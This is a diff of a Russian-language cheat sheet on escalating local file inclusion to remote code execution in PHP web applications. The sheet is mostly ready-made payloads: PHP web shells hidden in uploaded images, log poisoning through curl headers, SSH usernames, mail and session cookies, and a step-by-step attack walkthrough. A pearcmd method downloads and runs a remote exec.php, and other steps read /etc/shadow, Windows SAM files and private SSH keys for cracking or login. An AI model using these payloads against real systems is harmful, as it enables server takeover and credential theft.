@@ -8,10 +8,12 @@
 * [LFI в RCE через raceCondition](#LFI-в-RCE-через-raceCondition)
 * [LFI в RCE через загрузку (FindFirstFile)](#LFI-в-RCE-через-загрузку-FindFirstFile)
 * [LFI в RCE через phpinfo()](#LFI-в-RCE-через-phpinfo)
-* [LFI в RCE через контролируемый лог-файл](#LFI-в-RCE-через-контролируемый-лог-файл)
+* [LFI в RCE через контролируемый лог-файл](#LFI-в-RCE-через-контролируемый-лог-файл) 
+    * [Методы внедрения кода в логи](#Методы-внедрения-кода-в-логи)
     * [RCE через SSH](#RCE-через-SSH)
     * [RCE через почту](#RCE-через-почту)
     * [RCE через логи Apache](#RCE-через-логи-Apache)
+    * [Практические примеры](#Практические-примеры)
 * [LFI в RCE через PHP сессии](#LFI-в-RCE-через-PHP-сессии)
 * [LFI в RCE через PHP PEARCMD](#LFI-в-RCE-через-PHP-PEARCMD)
 * [LFI в RCE через файлы учетных данных](#LFI-в-RCE-через-файлы-учетных-данных)
@@ -52,7 +54,7 @@ User-Agent: <?=phpinfo(); ?>
 
 # LFI в RCE через загрузку файлов
 
-* Если можно загрузить файл, просто внедри шелл в него (например: <?php system($_GET['c']); ?>).
+* Если можно загрузить файл, просто внедри шелл в него (например: ```<?php system($_GET['c']); ?>)```.
 
 ```python
 http://example.com/index.php?page=path/to/uploaded/file.png&c=id
@@ -68,17 +70,12 @@ pngcrush -text a "Comment" "<?php system($_GET['c']); ?>" original.png infected.
 
 # LFI в RCE через raceCondition
 
-    Загрузите файл и вызовите само-включение.
-
-    Повторите загрузку множество раз чтобы:
-
-        увеличить шансы на выигрыш гонки
-
-        увеличить шансы угадывания
-
-    Подберите брутфорсом включение /tmp/[0-9a-zA-Z]{6}
-
-    Получите шелл.
+* Загрузи файл и вызови само-включение.
+* Повтори загрузку множество раз чтобы:
+   * увеличить шансы на выигрыш гонки
+   * увеличить шансы угадывания
+* Подбери брутфорсом включение /tmp/[0-9a-zA-Z]{6}
+* Получи шелл.
 
 ```python
 import itertools
@@ -105,19 +102,20 @@ print('[x] Something went wrong, please try again')
 
 ⚠️ Работает только на Windows
 
-FindFirstFile позволяет использовать маски (<< как * и > как ?) в путях LFI на Windows. Маска - это essentially шаблон поиска, который может включать символы подстановки, позволяя пользователям или разработчикам искать файлы или каталоги на основе частичных имен или типов. В контексте FindFirstFile маски используются для фильтрации и сопоставления имен файлов или каталогов.
+```FindFirstFile``` позволяет использовать маски (```<<``` как ```*``` и ```>``` как ```?```) в путях LFI на Windows. 
 
-    */<< : Представляет любую последовательность символов.
+> Маска - это, по сути, шаблон поиска, который может включать символы подстановки, позволяя пользователям или разработчикам искать файлы или каталоги на основе частичных имен или типов. В контексте FindFirstFile маски используются для фильтрации и сопоставления имен файлов или каталогов.
 
-    ?/> : Представляет любой одиночный символ.
+* */<< : Представляет любую последовательность символов.
+* ?/> : Представляет любой одиночный символ.
 
-Загрузите файл, он должен быть сохранен во временной папке C:\Windows\Temp\ со сгенерированным именем типа php[A-F0-9]{4}.tmp. Затем либо подберите брутфорсом 65536 имен файлов, либо используйте символ подстановки: http://site/vuln.php?inc=c:\windows\temp\php<<
+Загрузи файл, он должен быть сохранен во временной папке C:\Windows\Temp\ со сгенерированным именем типа php[A-F0-9]{4}.tmp. Затем либо подберите брутфорсом 65536 имен файлов, либо используйте символ подстановки: http://site/vuln.php?inc=c:\windows\temp\php<<
 
 # LFI в RCE через phpinfo()
 
 PHPinfo() отображает содержимое любых переменных, таких как $_GET, $_POST и $_FILES.
 
-    Сделав несколько запросов загрузки на скрипт PHPInfo и тщательно контролируя чтения, можно получить имя временного файла и сделать запрос к скрипту LFI, указав имя временного файла.
+> Сделав несколько запросов загрузки на скрипт PHPInfo и тщательно контролируя чтения, можно получить имя временного файла и сделать запрос к скрипту LFI, указав имя временного файла.
 
 Используйте скрипт [phpInfoLFI.py](https://insomniasec.com/downloads/publications/phpinfolfi.py)
 
@@ -134,30 +132,65 @@ http://example.com/index.php?page=/var/log/nginx/access.log
 http://example.com/index.php?page=/var/log/nginx/error.log
 http://example.com/index.php?page=/var/log/vsftpd.log
 http://example.com/index.php?page=/var/log/sshd.log
-http://example.com/index.php?page=/var/log/mail
+http://example.com/index.php?page=/var/log/auth.log
+http://example.com/index.php?page=/var/log/mail.log 
+http://example.com/index.php?page=/var/log/syslog 
 http://example.com/index.php?page=/var/log/httpd/error_log
 http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
 ```
 
-# RCE через SSH
+### Методы внедрения кода в логи
+
+1. Через User-Agent 
+
+```bash
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+```
+```http
+http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id
+```
+
+2. Через Referer
+
+```bash
+curl -H "Referer: <?php system(\$_GET['c']); ?>" http://target.com/
+```
+
+3. Через параметры URL
+
+```bash
+curl "http://target.com/<?php system(\$_GET['cmd']); ?>"
+```
+
+### RCE через SSH
 
 Попробуй подключиться по SSH с PHP кодом в качестве имени пользователя <?php system($_GET["cmd"]);?>.
 
-```php
-ssh <?php system($_GET["cmd"]);?>@10.10.10.10
+* Внедрение через SSH подключение:
+
+```bash
+ssh '<?php system($_GET["cmd"]); ?>'@target.com
 ```
 
-Затем включите лог-файлы SSH в веб-приложении.
+* Или с паролем:
 
-```python
-http://example.com/index.php?page=/var/log/auth.log&cmd=id
+```bash
+sshpass -p 'password' ssh '<?php system($_GET["cmd"]); ?>'@target.com
 ```
 
-# RCE через почту
+* Эксплуатация:
+
+```http
+http://target.com/vuln.php?page=/var/log/auth.log&cmd=id
+```
+
+### RCE через почту
 
 Сначала отправьте email используя открытый SMTP, затем включите лог-файл расположенный по адресу http://example.com/index.php?page=/var/log/mail.
 
+1. Через telnet
+   
 ```python
 root@kali:~# telnet 10.10.10.10. 25
 Trying 10.10.10.10....
@@ -181,22 +214,58 @@ data2
 
 ```php
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
+echo "<?php system(\$_GET['cmd']); ?>" | mail -s "Test" www-data@target.com
 ```
 
-# RCE через логи Apache
+* Эксплуатация:
 
-Отравьте User-Agent в access logs:
-
-```php
-curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+```http
+http://target.com/vuln.php?page=/var/log/mail.log&cmd=id
 ```
 
-Примечание: Логи экранируют двойные кавычки, поэтому используйте одинарные кавычки для строк в PHP полезной нагрузке.
+### RCE через логи Apache
 
-Затем запросите логи через LFI и выполните вашу команду.
+* **Отравление access.log**
 
-```python
-curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+* Через User-Agent
+  
+```bash
+curl -A "<?php system(\$_GET['c']); ?>" http://target.com/
+```
+
+* Через Referer
+
+```bash
+curl -H "Referer: <?php system(\$_GET['c']); ?>" http://target.com/
+```
+
+* Через путь
+
+```bash
+curl http://target.com/<?php system(\$_GET['c']); ?>
+```
+
+> **Примечание:** Логи экранируют двойные кавычки, поэтому используйте одинарные кавычки для строк в PHP полезной нагрузке.
+
+* Эксплуатация:
+
+```http
+http://target.com/vuln.php?page=/var/log/apache2/access.log&c=id
+```
+
+### Практические примеры
+
+```bash
+# Шаг 1: Внедряем код в логи через User-Agent
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+
+# Шаг 2: Проверяем наличие LFI
+curl "http://target.com/vuln.php?page=/var/log/apache2/access.log"
+
+# Шаг 3: Выполняем команды
+curl "http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=whoami"
+curl "http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id"
+curl "http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=ls+-la"
 ```
 
 # LFI в RCE через PHP сессии
@@ -214,27 +283,35 @@ Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
 user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
 ```
+
 Установите cookie в ```<?php system('cat /etc/passwd');?>```
 
 ```php
 login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 ```
 
-# Используйте LFI для включения файла PHP сессии
+Используй LFI для включения файла PHP сессии
 
 ```python
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
 
+* **Параметры, которые часто сохраняются в сессии:**
+   * ```lang```, ```language```, ```locale```
+   * ```theme```, ```skin```, ```template```
+   * ```username```, ```user```, ```login```
+   * ```preferences```, ```settings```
+
 # LFI в RCE через PHP PEARCMD
 
-* PEAR - это фреймворк и система распространения для повторно используемых компонентов PHP. По умолчанию pearcmd.php устанавливается в каждом Docker PHP образе с hub.docker.com в /usr/local/lib/php/pearcmd.php.
+> PEAR - это фреймворк и система распространения для повторно используемых компонентов PHP. По умолчанию ```pearcmd.php``` устанавливается в каждом Docker PHP образе с [hub.docker.com](https://hub.docker.com/_/php) в ```/usr/local/lib/php/pearcmd.php```.
 
-Файл pearcmd.php использует $_SERVER['argv'] для получения своих аргументов. Директива register_argc_argv должна быть установлена в On в конфигурации PHP (php.ini) для работы этой атаки.
+Файл pearcmd.php использует ```$_SERVER['argv']``` для получения своих аргументов. Директива ```register_argc_argv``` должна быть установлена в On в конфигурации PHP (```php.ini```) для работы этой атаки.
 
 ```python
 register_argc_argv = On
 ```
+
 Есть несколько способов эксплуатации:
 
 * Метод 1: config create
@@ -265,7 +342,7 @@ a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"ma
 /vuln.php?file=exec.php&c=id
 ```
 
-* Метод 4: install (требует внешнего сетевого подключения). Заметьте, что exec.php находится по пути /tmp/pear/download/exec.php.
+* Метод 4: install (требует внешнего сетевого подключения). ```exec.php``` находится по пути ```/tmp/pear/download/exec.php```.
 
 ```php
 /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
@@ -278,23 +355,23 @@ a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"ma
 
 ### Версия для Windows
 
-1. Извлеките файлы sam и system.
+1. Извлеки файлы ```sam``` и ```system```.
 
 ```python
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 ```
 
-2. Затем извлеките хеши из этих файлов samdump2 SYSTEM SAM > hashes.txt, и взломайте их с помощью hashcat/john или используйте их с помощью техники Pass The Hash.
+2. Затем извлеки хеши из этих файлов ```samdump2 SYSTEM SAM > hashes.txt```, и взломай их с помощью ```hashcat/john``` или используйте их с помощью техники Pass The Hash.
 
 ### Версия для Linux
 
-1. Извлеките файлы /etc/shadow.
+1. Извлеки файлы /etc/shadow.
 
 ```python
 http://example.com/index.php?page=../../../../../../etc/shadow
 ```
 
-2. Затем взломайте хеши внутри, чтобы войти через SSH на машину.
+2. Затем взломай хеши внутри, чтобы войти через SSH на машину.
 
 > **Другой способ получить доступ SSH к машине Linux через LFI** - это чтение файла приватного SSH ключа: id_rsa. Если SSH активен, проверьте, какой пользователь используется в машине, включив содержимое /etc/passwd и попытайтесь получить доступ к /<HOME>/.ssh/id_rsa для каждого пользователя с домашним каталогом.
